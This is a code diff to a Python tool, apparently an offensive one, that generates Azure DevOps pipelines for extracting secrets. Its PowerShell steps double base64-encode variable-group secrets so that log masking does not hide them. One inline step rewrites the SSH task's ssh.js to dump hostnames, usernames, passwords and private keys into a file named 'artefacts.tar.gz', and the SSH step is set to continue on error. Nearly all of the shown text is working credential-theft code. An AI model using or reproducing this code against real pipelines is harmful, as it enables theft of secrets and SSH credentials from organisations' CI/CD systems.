@@ -22,6 +22,7 @@ if ($output) {{
     $base1 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
     $base2 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($base1))
     Write-Host $base2
+    Write-Host ""
 }}"""
 
     def generatePipelineForSecretExtraction(self, variableGroup, poolName=None, os="linux"):
@@ -34,35 +35,26 @@ if ($output) {{
             for sec in secrets:
                 key = f"secret_{sec}"
                 value = f"$({sec})"
-                secretVars = secretVars + "'" + key + "'" + "=" + "\"" + value + "\"" + "\n"
+                secretVars += f"'{key}'=\"{value}\"\n"
             
-            script_body = """
-$secret_vars = @{{
+            fetch_logic = f"""$secret_vars = @{{
 {secretVars}
 }}
 
 $output = ""
 $secret_vars.GetEnumerator() | ForEach-Object {{
     $output += "$($_.Key)=$($_.Value)`n" 
-}}
-    
-$output = $output.TrimEnd("`n")
-$base1 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(("{{0}}" -f $output)))
-$base2 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(("{{0}}" -f $base1)))
-Write-Host $base2
-Write-Host ""
-""".format(secretVars=secretVars)
+}}"""
 
             self._defaultTemplate["steps"].append({
                 "task": "PowerShell@2",
                 "displayName": self.taskName,
                 "inputs": {
                     "targetType": "inline",
-                    "script": script_body
+                    "script": self._get_ps_b64_script(fetch_logic)
                 }
             })
         else:
-            # Linux continues to use the environment mapping approach
             env_vars = {f"secret_{sec}": f"$({sec})" for sec in secrets}
             self._defaultTemplate["steps"].append({
                 "task": "Bash@3",
@@ -130,7 +122,7 @@ Write-Host ""
                 "repository": "devRepo",
                 "type": "github",
                 "endpoint": endpoint,
-                "name": "microsoft/azure-pipelines-tasks",
+                "name": "github/g-emoji-element",
             }]
         }
         
@@ -223,7 +215,11 @@ Write-Host ""
                         "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; copy $p ($p+".bak"); (Get-Content -Path $p -Raw) -replace [regex]::Escape(\'const readyTimeout = getReadyTimeoutVariable();\'), \'const readyTimeout = getReadyTimeoutVariable();const fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("artefacts.tar.gz", data, (err) => {});\' | Set-Content -Path $p }',
                     },
                 },
-                {"task": "SSH@0", "inputs": {"sshEndpoint": sshSCName, "runOptions": "commands", "commands": "sleep 1"}},
+                {
+                    "task": "SSH@0",
+                    "continueOnError": True,
+                    "inputs": {"sshEndpoint": sshSCName, "runOptions": "commands", "commands": "sleep 1"},
+                },
                 {
                     "task": "PowerShell@2",
                     "displayName": self.taskName,
